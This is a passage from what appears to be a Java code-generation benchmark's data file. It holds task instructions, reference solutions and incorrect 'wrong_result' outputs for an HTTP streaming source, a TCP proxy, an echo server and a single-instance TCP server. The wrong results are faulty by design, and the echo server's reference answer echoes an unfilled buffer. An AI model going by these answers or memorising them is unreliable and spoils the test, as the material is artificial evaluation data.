server.getInputStream();\n                        OutputStream serverOut = server.getOutputStream();\n\n                        byte[] buffer = new byte[1024];\n                        int bytesRead;\n\n                        while ((bytesRead = clientIn.read(buffer)) != -1) {\n                            serverOut.write(buffer, 0, bytesRead);\n                        }\n\n                        while ((bytesRead = serverIn.read(buffer)) != -1) {\n                            clientOut.write(buffer, 0, bytesRead);\n                        }\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    } finally {\n                        try {\n                            if (client != null) client.close();\n                            if (server != null) server.close();\n                        } catch (IOException e) {\n                            e.printStackTrace();\n                        }\n                    }\n                });\n                handler.start();\n            } catch (IOException e) {\n                if (!running) break;\n            }\n        }\n        try {\n            if (serverSocket != null) serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}"
  },
  {
    "Task_id": 54,
    "Instruction": "Task Description: Implement a Java class that handles HTTP URL connections for streaming content with support for caching, custom headers, and partial content requests.\n\nClass Description: HttpUrlSource is a class designed to manage HTTP connections for streaming media content. It supports range requests, handles redirects, injects custom headers, and caches source information (URL, content length, MIME type). The class provides methods to open, read, and close connections while managing connection timeouts and redirects.\n\nAttributes:\n\nsourceInfoStorage: [SourceInfoStorage] - Storage for caching source information (URL, length, MIME type)\nheaderInjector: [HeaderInjector] - Injects custom headers into HTTP requests\nsourceInfo: [SourceInfo] - Contains information about the media source (URL, length, MIME type)\nconnection: [HttpURLConnection] - Active HTTP connection\ninputStream: [InputStream] - Input stream for reading content\n\nMethods:\n\nlength(): [long] - Returns the content length of the source, fetching it if not already cached\nopen([long] offset) -> [void] - Opens a connection to the source with optional byte offset\nclose() -> [void] - Closes the current connection\nread([byte[]] buffer) -> [int] - Reads data from the input stream into the buffer\ngetMime() -> [String] - Returns the MIME type of the source, fetching it if not already cached\ngetUrl() -> [String] - Returns the source URL\nfetchContentInfo() -> [void] - Fetches and caches content information (length and MIME type)\nopenConnection([long] offset, [int] timeout) -> [HttpURLConnection] - Opens a connection with optional offset and timeout, handling redirects\ninjectCustomHeaders([HttpURLConnection] connection, [String] url) -> [void] - Injects custom headers into the connection\nreadSourceAvailableBytes([HttpURLConnection] connection, [long] offset, [int] responseCode) -> [long] - Calculates available bytes based on response code\ngetContentLength([HttpURLConnection] connection) -> [long] - Extracts content length from connection headers",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.danikula.videocache.headers.HeaderInjector;\nimport com.danikula.videocache.sourcestorage.SourceInfoStorage;\nimport java.io.BufferedInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InterruptedIOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport static com.danikula.videocache.Preconditions.checkNotNull;\nimport static com.danikula.videocache.ProxyCacheUtils.DEFAULT_BUFFER_SIZE;\nimport static java.net.HttpURLConnection.HTTP_MOVED_PERM;\nimport static java.net.HttpURLConnection.HTTP_MOVED_TEMP;\nimport static java.net.HttpURLConnection.HTTP_OK;\nimport static java.net.HttpURLConnection.HTTP_PARTIAL;\nimport static java.net.HttpURLConnection.HTTP_SEE_OTHER;\n\npublic class HttpUrlSource {\n\n    private static final int MAX_REDIRECTS = 5;\n    private final SourceInfoStorage sourceInfoStorage;\n    private final HeaderInjector headerInjector;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HeaderInjector headerInjector) {\n        this.sourceInfoStorage = checkNotNull(sourceInfoStorage);\n        this.headerInjector = checkNotNull(headerInjector);\n        SourceInfo sourceInfo = sourceInfoStorage.get(url);\n        this.sourceInfo = sourceInfo != null ? sourceInfo :\n                new SourceInfo(url, Integer.MIN_VALUE, ProxyCacheUtils.getSupposablyMime(url));\n    }\n\n    public synchronized long length() throws ProxyCacheException {\n        if (sourceInfo.length == Integer.MIN_VALUE) {\n            fetchContentInfo();\n        }\n        return sourceInfo.length;\n    }\n\n    public void open(long offset) throws ProxyCacheException {\n        try {\n            connection = openConnection(offset, -1);\n            String mime = connection.getContentType();\n            inputStream = new BufferedInputStream(connection.getInputStream(), DEFAULT_BUFFER_SIZE);\n            long length = readSourceAvailableBytes(connection, offset, connection.getResponseCode());\n            this.sourceInfo = new SourceInfo(sourceInfo.url, length, mime);\n            this.sourceInfoStorage.put(sourceInfo.url, sourceInfo);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error opening connection for \" + sourceInfo.url + \" with offset \" + offset, e);\n        }\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int responseCode) throws IOException {\n        long contentLength = getContentLength(connection);\n        return responseCode == HTTP_OK ? contentLength\n                : responseCode == HTTP_PARTIAL ? contentLength + offset : sourceInfo.length;\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        String contentLengthValue = connection.getHeaderField(\"Content-Length\");\n        return contentLengthValue == null ? -1 : Long.parseLong(contentLengthValue);\n    }\n\n    public void close() throws ProxyCacheException {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (NullPointerException | IllegalArgumentException e) {\n                throw new RuntimeException(\"Error closing connection\", e);\n            }\n        }\n    }\n\n    public int read(byte[] buffer) throws ProxyCacheException {\n        if (inputStream == null) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url + \": connection is absent!\");\n        }\n        try {\n            return inputStream.read(buffer, 0, buffer.length);\n        } catch (InterruptedIOException e) {\n            throw new InterruptedProxyCacheException(\"Reading source \" + sourceInfo.url + \" is interrupted\", e);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url, e);\n        }\n    }\n\n    private void fetchContentInfo() throws ProxyCacheException {\n        HttpURLConnection urlConnection = null;\n        InputStream inputStream = null;\n        try {\n            urlConnection = openConnection(0, 10000);\n            long length = getContentLength(urlConnection);\n            String mime = urlConnection.getContentType();\n            inputStream = urlConnection.getInputStream();\n            this.sourceInfo = new SourceInfo(sourceInfo.url, length, mime);\n            this.sourceInfoStorage.put(sourceInfo.url, sourceInfo);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error fetching info from \" + sourceInfo.url, e);\n        } finally {\n            ProxyCacheUtils.close(inputStream);\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) throws IOException, ProxyCacheException {\n        HttpURLConnection connection;\n        boolean redirected;\n        int redirectCount = 0;\n        String url = this.sourceInfo.url;\n        do {\n            connection = (HttpURLConnection) new URL(url).openConnection();\n            injectCustomHeaders(connection, url);\n            if (offset > 0) {\n                connection.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            if (timeout > 0) {\n                connection.setConnectTimeout(timeout);\n                connection.setReadTimeout(timeout);\n            }\n            int code = connection.getResponseCode();\n            redirected = code == HTTP_MOVED_PERM || code == HTTP_MOVED_TEMP || code == HTTP_SEE_OTHER;\n            if (redirected) {\n                url = connection.getHeaderField(\"Location\");\n                redirectCount++;\n                connection.disconnect();\n            }\n            if (redirectCount > MAX_REDIRECTS) {\n                throw new ProxyCacheException(\"Too many redirects: \" + redirectCount);\n            }\n        } while (redirected);\n        return connection;\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String url) {\n        Map<String, String> extraHeaders = headerInjector.addHeaders(url);\n        for (Map.Entry<String, String> header : extraHeaders.entrySet()) {\n            connection.setRequestProperty(header.getKey(), header.getValue());\n        }\n    }\n\n    public synchronized String getMime() throws ProxyCacheException {\n        if (TextUtils.isEmpty(sourceInfo.mime)) {\n            fetchContentInfo();\n        }\n        return sourceInfo.mime;\n    }\n\n    public String getUrl() {\n        return sourceInfo.url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic class HttpUrlSource {\n    private SourceInfoStorage sourceInfoStorage;\n    private HeaderInjector headerInjector;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public long length() {\n        if (sourceInfo == null || sourceInfo.getContentLength() == -1) {\n            fetchContentInfo();\n        }\n        return sourceInfo.getContentLength();\n    }\n\n    public void open(long offset) {\n        connection = openConnection(offset, 10000);\n        inputStream = connection.getInputStream();\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.disconnect();\n        }\n    }\n\n    public int read(byte[] buffer) {\n        return inputStream.read(buffer);\n    }\n\n    public String getMime() {\n        if (sourceInfo == null || sourceInfo.getMimeType() == null) {\n            fetchContentInfo();\n        }\n        return sourceInfo.getMimeType();\n    }\n\n    public String getUrl() {\n        return sourceInfo.getUrl();\n    }\n\n    private void fetchContentInfo() {\n        String url = sourceInfo.getUrl();\n        try {\n            URL urlObj = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n            injectCustomHeaders(conn, url);\n            int responseCode = conn.getResponseCode();\n            while (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP) {\n                String newLocation = conn.getHeaderField(\"Location\");\n                if (newLocation == null) {\n                    throw new RuntimeException(\"Redirect location not found\");\n                }\n                url = newLocation;\n                urlObj = new URL(url);\n                conn = (HttpURLConnection) urlObj.openConnection();\n                injectCustomHeaders(conn, url);\n                responseCode = conn.getResponseCode();\n            }\n            sourceInfo.setContentLength(getContentLength(conn));\n            sourceInfo.setMimeType(conn.getContentType());\n            sourceInfoStorage.save(sourceInfo);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) {\n        String url = sourceInfo.getUrl();\n        try {\n            URL urlObj = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n            conn.setConnectTimeout(timeout);\n            conn.setReadTimeout(timeout);\n            injectCustomHeaders(conn, url);\n            int responseCode = conn.getResponseCode();\n            while (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP) {\n                String newLocation = conn.getHeaderField(\"Location\");\n                if (newLocation == null) {\n                    throw new RuntimeException(\"Redirect location not found\");\n                }\n                url = newLocation;\n                urlObj = new URL(url);\n                conn = (HttpURLConnection) urlObj.openConnection();\n                injectCustomHeaders(conn, url);\n                responseCode = conn.getResponseCode();\n            }\n            if (offset > 0) {\n                conn.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            return conn;\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String url) {\n        headerInjector.inject(connection, url);\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int responseCode) {\n        if (responseCode == HttpURLConnection.HTTP_PARTIAL) {\n            return getContentLength(connection);\n        } else if (responseCode == HttpURLConnection.HTTP_NOT_MODIFIED) {\n            return 0;\n        } else {\n            return getContentLength(connection);\n        }\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        Long cl = connection.getContentLengthLong();\n        if (cl != -1) {\n            return cl;\n        }\n        return -1;\n    }\n}"
  },
  {
    "Task_id": 540,
    "Instruction": "Task Description: Implement a TCP proxy server class that can forward traffic between a client and a remote server, with the ability to start, stop, and manage connections dynamically.\n\nClass Description: The ConnectionManipulationProxyServer class acts as a TCP proxy that listens on a local port, accepts client connections, and forwards traffic to a specified remote host and port. It provides thread-safe control over the proxy's operation and proper resource cleanup.\n\nAttributes:\n- localPort: [int] - The local port on which the proxy listens for client connections\n- host: [String] - The remote host address to which traffic will be forwarded\n- remotePort: [int] - The remote port to which traffic will be forwarded\n- proxyThread: [Thread] - The thread running the proxy operation\n- enableLock: [Object] - Synchronization lock for thread-safe operation control\n- enableProxy: [boolean] - Flag indicating whether the proxy is currently enabled\n- running: [boolean] - Flag indicating whether the proxy thread should continue running\n- client: [Socket] - The client-side socket connection\n- server: [Socket] - The server-side socket connection\n- serverSocket: [ServerSocket] - The server socket listening for client connections\n\nMethods:\n- ConnectionManipulationProxyServer([String host, int remotePort, int localPort]) -> [void] - Constructor that initializes the proxy with target host and port information\n- startProxy() -> [void] - Starts the proxy server thread and enables traffic forwarding\n- stopProxy() -> [void] - Stops the proxy server thread and disables traffic forwarding\n- killOpenSockets() -> [void] - Closes all open sockets and cleans up resources\n- run() -> [void] - Main proxy thread execution method that handles connection setup and data forwarding\n- getLocalPort() -> [int] - Returns the local port on which the proxy is listening",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Logger;\n\npublic class ConnectionManipulationProxyServer implements Runnable {\n    private static final Logger log = Logger.getLogger(ConnectionManipulationProxyServer.class.getName());\n    private int localPort;\n    private String host;\n    private int remotePort;\n    private Thread proxyThread;\n    private final Object enableLock = new Object();\n    private boolean enableProxy = true;\n    private boolean running = true;\n    private Socket client = null;\n    private Socket server = null;\n    private ServerSocket serverSocket = null;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.localPort = localPort;\n        this.remotePort = remotePort;\n        this.host = host;\n        this.proxyThread = new Thread(this);\n    }\n\n    public void startProxy() {\n        log.info(\"[CMPS Proxy] - Starting Proxy\");\n        synchronized (enableLock) {\n            enableProxy = true;\n        }\n        running = true;\n        proxyThread.start();\n    }\n\n    public void stopProxy() {\n        log.info(\"[CMPS Proxy] - Stopping Proxy\");\n        synchronized (enableLock) {\n            enableProxy = false;\n        }\n        running = false;\n        killOpenSockets();\n    }\n\n    private void killOpenSockets() {\n        log.info(\"[CMPS Proxy] - killOpenSockets Called.\");\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n            if (client != null) {\n                client.close();\n            }\n            if (server != null) {\n                server.close();\n            }\n        } catch (IOException ex) {\n            // Ignore during cleanup\n        }\n    }\n\n    @Override\n    public void run() {\n        log.info(\"[CMPS Proxy] - Proxy Thread running.\");\n        try {\n            final byte[] request = new byte[1024];\n            byte[] reply = new byte[4096];\n            \n            while (running) {\n                synchronized (enableLock) {\n                    if (!enableProxy) continue;\n                }\n\n                if (serverSocket == null || serverSocket.isClosed()) {\n                    serverSocket = new ServerSocket(localPort);\n                    localPort = serverSocket.getLocalPort();\n                }\n\n                log.info(\"[CMPS Proxy] - Waiting for incoming connection..\");\n                \n                try {\n                    client = serverSocket.accept();\n                    log.info(\"[CMPS Proxy] - Client Opened Connection to Proxy...\");\n                    \n                    final InputStream streamFromClient = client.getInputStream();\n                    final OutputStream streamToClient = client.getOutputStream();\n                    \n                    server = new Socket(host, remotePort);\n                    log.info(\"Proxy: Proxy Connected to Server\");\n                    \n                    final InputStream streamFromServer = server.getInputStream();\n                    final OutputStream streamToServer = server.getOutputStream();\n                    \n                    Thread thread = new Thread() {\n                        public void run() {\n                            int bytesRead;\n                            try {\n                                while ((bytesRead = streamFromClient.read(request)) != -1) {\n                                    streamToServer.write(request, 0, bytesRead);\n                                    streamToServer.flush();\n                                }\n                            } catch (IOException ex) {\n                                log.warning(\"[CMPS Proxy] - IOException in client to server stream: \" + ex.getMessage());\n                                try {\n                                    client.close();\n                                    server.close();\n                                } catch (IOException e) {\n                                    // Ignore during cleanup\n                                }\n                            }\n                        }\n                    };\n                    thread.start();\n                    \n                    int bytesRead;\n                    try {\n                        while ((bytesRead = streamFromServer.read(reply)) != -1) {\n                            streamToClient.write(reply, 0, bytesRead);\n                            streamToClient.flush();\n                        }\n                    } catch (IOException ex) {\n                        log.warning(\"[CMPS Proxy] - IOException in server to client stream: \" + ex.getMessage());\n                        client.close();\n                        server.close();\n                    }\n                    \n                    streamToClient.close();\n                    \n                } catch (IOException ex) {\n                    log.warning(\"[CMPS Proxy] - General IO Exception caught in main Thread: \" + ex.getMessage());\n                    break;\n                } finally {\n                    try {\n                        if (server != null) {\n                            server.close();\n                        }\n                        if (client != null) {\n                            client.close();\n                        }\n                    } catch (IOException ex) {\n                        log.warning(\"[CMPS Proxy] - IOException caught whilst closing proxy connection: \" + ex.getMessage());\n                    }\n                }\n            }\n            \n            if (!serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n            log.info(\"[CMPS Proxy] - Server Socket Closed, returning...\");\n            \n        } catch (IOException ex) {\n            log.warning(\"[CMPS Proxy] - Thread Connection lost: \" + ex.getMessage());\n            ex.printStackTrace();\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class ConnectionManipulationProxyServer {\n    private int localPort;\n    private String host;\n    private int remotePort;\n    private Thread proxyThread;\n    private final Object enableLock = new Object();\n    private boolean enableProxy;\n    private boolean running;\n    private Socket client;\n    private Socket server;\n    private ServerSocket serverSocket;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.host = host;\n        this.remotePort = remotePort;\n        this.localPort = localPort;\n        try {\n            serverSocket = new ServerSocket(localPort);\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    public void startProxy() {\n        synchronized (enableLock) {\n            enableProxy = true;\n            running = true;\n            proxyThread = new Thread(this::run);\n            proxyThread.start();\n        }\n    }\n\n    public void stopProxy() {\n        synchronized (enableLock) {\n            running = false;\n            enableProxy = false;\n            killOpenSockets();\n        }\n    }\n\n    public void killOpenSockets() {\n        try {\n            if (client != null) {\n                client.close();\n            }\n            if (server != null) {\n                server.close();\n            }\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    public void run() {\n        try {\n            while (running) {\n                client = serverSocket.accept();\n                server = new Socket(host, remotePort);\n                new Thread(() -> {\n                    try {\n                        BufferedReader inClient = new BufferedReader(new InputStreamReader(client.getInputStream()));\n                        PrintWriter outServer = new PrintWriter(server.getOutputStream(), true);\n                        String line;\n                        while ((line = inClient.readLine()) != null) {\n                            outServer.println(line);\n                        }\n                    } catch (IOException e) {\n                        // Handle exception\n                    } finally {\n                        try {\n                            client.close();\n                            server.close();\n                        } catch (IOException e) {\n                            // Handle\n                        }\n                    }\n                }).start();\n\n                new Thread(() -> {\n                    try {\n                        BufferedReader inServer = new BufferedReader(new InputStreamReader(server.getInputStream()));\n                        PrintWriter outClient = new PrintWriter(client.getOutputStream(), true);\n                        String line;\n                        while ((line = inServer.readLine()) != null) {\n                            outClient.println(line);\n                        }\n                    } catch (IOException e) {\n                        // Handle exception\n                    } finally {\n                        try {\n                            client.close();\n                            server.close();\n                        } catch (IOException e) {\n                            // Handle\n                        }\n                    }\n                }).start();\n            }\n        } catch (IOException e) {\n            // Handle\n        } finally {\n            try {\n                if (serverSocket != null) {\n                    serverSocket.close();\n                }\n            } catch (IOException e) {\n                // Handle\n            }\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}"
  },
  {
    "Task_id": 541,
    "Instruction": "Task Description: Implement a TCP server in Java that handles multiple client connections concurrently using blocking I/O. The server should echo back any data received from clients after sending an initial welcome message.\n\nClass Description: EchoBioServer is a TCP server implementation that listens for incoming client connections on a specified port. For each connection, it creates a new thread to handle communication, sending a welcome message initially and then echoing back all received data.\n\nAttributes:\n- FIRST_BYTES: byte[] - The welcome message to be sent to clients upon connection\n- serverSocket: ServerSocket - The server socket listening for incoming connections\n\nMethods:\n- EchoBioServer(int port) -> void - Constructor that initializes the server socket on the specified port\n- run() -> void - Main server loop that accepts incoming connections and spawns new threads for each client\n- BioConnection(Socket socket) -> void - Nested class constructor that handles individual client connections\n- run() -> void - (In BioConnection) Handles the communication with a single client, echoing received data\n\nNested Class: BioConnection\nAttributes:\n- socket: Socket - The client socket connection\n- input: InputStream - Input stream for reading client data\n- output: OutputStream - Output stream for writing to client\n- readBuffer: byte[] - Buffer for storing received data\n- writeBuffer: byte[] - Buffer for storing data to send\n\nMethods:\n- BioConnection(Socket socket) -> void - Constructor that initializes I/O streams and buffers for a client connection\n- run() -> void - Handles the client communication loop (send welcome message, echo received data)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EchoBioServer implements Runnable {\n\n    private static final byte[] FIRST_BYTES = \"Welcome to Cobar Server.\".getBytes();\n    private final ServerSocket serverSocket;\n\n    public EchoBioServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Socket socket = serverSocket.accept();\n                new Thread(new BioConnection(socket)).start();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class BioConnection implements Runnable {\n        private Socket socket;\n        private InputStream input;\n        private OutputStream output;\n        private byte[] readBuffer;\n        private byte[] writeBuffer;\n\n        private BioConnection(Socket socket) throws IOException {\n            this.socket = socket;\n            this.input = socket.getInputStream();\n            this.output = socket.getOutputStream();\n            this.readBuffer = new byte[4096];\n            this.writeBuffer = new byte[4096];\n        }\n\n        @Override\n        public void run() {\n            try {\n                output.write(FIRST_BYTES);\n                output.flush();\n                while (true) {\n                    int got = input.read(readBuffer);\n                    output.write(writeBuffer, 0, got);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                if (socket != null) {\n                    try {\n                        socket.close();\n                    } catch (IOException e1) {\n                        e1.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class EchoBioServer {\n    private static final byte[] FIRST_BYTES = \"Welcome to the echo server!\\r\\n\".getBytes();\n    private ServerSocket serverSocket;\n\n    public EchoBioServer(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket socket = serverSocket.accept();\n                new BioConnection(socket).start();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class BioConnection extends Thread {\n        private Socket socket;\n        private InputStream input;\n        private OutputStream output;\n        private byte[] readBuffer = new byte[1024];\n        private byte[] writeBuffer = new byte[1024];\n\n        public BioConnection(Socket socket) {\n            this.socket = socket;\n            try {\n                input = socket.getInputStream();\n                output = socket.getOutputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        @Override\n        public void run() {\n            try {\n                output.write(FIRST_BYTES);\n                output.flush();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n\n            while (true) {\n                try {\n                    int bytesRead = input.read(readBuffer);\n                    if (bytesRead == -1) break;\n                    output.write(readBuffer, 0, bytesRead);\n                    output.flush();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    break;\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 542,
    "Instruction": "Task Description: Implement a TCP server class in Java that handles incoming client connections, processes commands, and interacts with a GUI frame. The server should support checking for existing instances, activating windows, and processing file operations.\n\nClass Description: TcpServer is a Thread subclass that creates a TCP server listening on a specified port. It communicates with clients to perform actions like getting window titles, activating windows, and opening files in the associated GUI frame.\n\nAttributes:\n- frame: IAppFrame - Reference to the application's GUI frame for window operations\n- port: int - The port number on which the server listens\n- file: String - File path to be processed (optional)\n\nMethods:\n- TcpServer(int port, IAppFrame frame) -> None - Constructor initializing server with port and frame reference\n- TcpServer(int port, IAppFrame frame, String file) -> None - Constructor with additional file parameter\n- checkExistInstance(int port) -> boolean - Static method checking if another instance is running on given port\n- ask(String host, String cmd, int port) -> boolean - Private static helper method for sending commands to existing instances\n- run() -> None - Main server thread method that listens for connections and processes client requests",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport javax.swing.JFrame;\nimport javax.swing.SwingUtilities;\n\npublic class TcpServer extends Thread {\n    private IAppFrame frame;\n    private int port;\n    private String file;\n\n    public static String GETWINDOWTITLE = \"GetWindowTitle\";\n    public static String ACTIVATE = \"ACTIVATE\";\n    public static String LOCALHOST = \"127.0.0.1\";\n\n    public TcpServer(int port, IAppFrame frame, String file) {\n        this(port, frame);\n        this.file = file;\n    }\n\n    public TcpServer(int port, IAppFrame frame) {\n        this.port = port;\n        this.frame = frame;\n    }\n\n    public static boolean checkExistInstance(int port) {\n        return ask(LOCALHOST, GETWINDOWTITLE, port);\n    }\n\n    private static boolean ask(String host, String cmd, int port) {\n        Socket s = new Socket();\n        try {\n            InetSocketAddress isa = new InetSocketAddress(host, port);\n            s.connect(isa, 2000);\n            OutputStream os = s.getOutputStream();\n            os.write(cmd.getBytes());\n            InputStream is = s.getInputStream();\n            byte[] buffer = new byte[1024];\n            int len = is.read(buffer);\n            String res = new String(buffer, 0, len);\n            return res != null && !res.isEmpty();\n        } catch (Exception x) {\n            return false;\n        } finally {\n            try {\n                s.close();\n            } catch (IOException e) {\n            }\n        }\n    }\n\n    public void run() {\n        ServerSocket ss = null;\n        try {\n            ss = new ServerSocket(port, 10, InetAddress.getByName(LOCALHOST));\n            while (true) {\n                Socket s = ss.accept();\n                try {\n                    InputStream is = s.getInputStream();\n                    byte[] buffer = new byte[1024];\n                    int len = is.read(buffer);\n                    String file = new String(buffer, 0, len);\n                    \n                    if (file.equals(GETWINDOWTITLE)) {\n                        OutputStream os = s.getOutputStream();\n                        String wTitle = ((JFrame) frame).getTitle();\n                        os.write(wTitle.getBytes());\n                    } else if (file.equals(ACTIVATE)) {\n                        ((JFrame) frame).toFront();\n                    } else {\n                        if (file.startsWith(\"\\\"\")) {\n                            file = file.substring(1, file.length() - 1);\n                        }\n                        final String sfile = file;\n                        SwingUtilities.invokeLater(() -> {\n                            try {\n                                frame.openSheetFile(sfile);\n                            } catch (Exception e) {\n                                e.printStackTrace();\n                            }\n                        });\n                    }\n                } finally {\n                    s.close();\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (ss != null) {\n                try {\n                    ss.close();\n                } catch (IOException e) {\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class TcpServer extends Thread {\n    private IAppFrame frame;\n    private int port;\n    private String file;\n\n    public TcpServer(int port, IAppFrame frame) {\n        this.port = port;\n        this.frame = frame;\n    }\n\n    public TcpServer(int port, IAppFrame frame, String file) {\n        this.port = port;\n        this.frame = frame;\n        this.file = file;\n    }\n\n    public static boolean checkExistInstance(int port) {\n        try (Socket socket = new Socket()) {\n            socket.connect(new InetSocketAddress(InetAddress.getLocalHost(), port), 1000);\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    private static boolean ask(String host, String cmd, int port) {\n        try (Socket socket = new Socket(host, port)) {\n            try (OutputStream out = socket.getOutputStream();\n                 InputStream in = socket.getInputStream()) {\n                byte[] cmdBytes = cmd.getBytes();\n                out.write(cmdBytes);\n                out.write('\\n');\n                byte[] buffer = new byte[1024];\n                int bytesRead = in.read(buffer);\n                if (bytesRead == -1) {\n                    return false;\n                }\n                String response = new String(buffer, 0, bytesRead);\n                return response.equals(\"OK\");\n            }\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    public void run() {\n        try (ServerSocket serverSocket = new ServerSocket(port)) {\n            System.out.println(\"Server started on port \" + port);\n            while (true) {\n                try (Socket clientSocket = serverSocket.accept();\n                     InputStream input = clientSocket.getInputStream();\n                     OutputStream output = clientSocket.getOutputStream()) {\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(input));\n                    String command = reader.readLine();\n                    if (command != null) {\n                        String[] parts = command.split(\" \");\n                        if (parts[0].equals(\"getWindowTitle\")) {\n                            String title = frame.getWindowTitle();\n                            output.write((title + \"\\n\").getBytes());\n                        } else if (parts[0].equals(\"activateWindow\")) {\n                            frame.activateWindow();\n                        } else if (parts[0].equals(\"openFile\")) {\n                            if (file != null) {\n                                frame.openFile(file);\n                            } else {\n                                output.write(\"File not specified\\n\".getBytes());\n                            }\n                        } else {\n                            output.write(\"Unknown command\\n\".getBytes());\n                        }\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 543,
    "Instruction": "Task Description: Implement a TCP server that listens for incoming connections and responds with a \"PONG\" message when a client connects. The server should run in a separate thread and be able to be gracefully shut down.\n\nClass Description: PingPongSocketServer is a TCP server implementation that listens on a specified port for client connections. Upon accepting a connection, it immediately sends a \"PONG\" response and closes the connection. The server runs in a dedicated thread and supports graceful termination.\n\nAttributes:\n- thread: Thread - The thread in which the server runs\n- serverSocket: ServerSocket - The socket that listens for incoming connections\n- terminated: boolean - Flag indicating whether the server should stop running\n\nMethods:\n- initialize(int port) -> void - Initializes the server by creating a ServerSocket on the specified port and starting the server thread\n- close() -> void - Gracefully shuts down the server by closing the ServerSocket and interrupting the server thread",
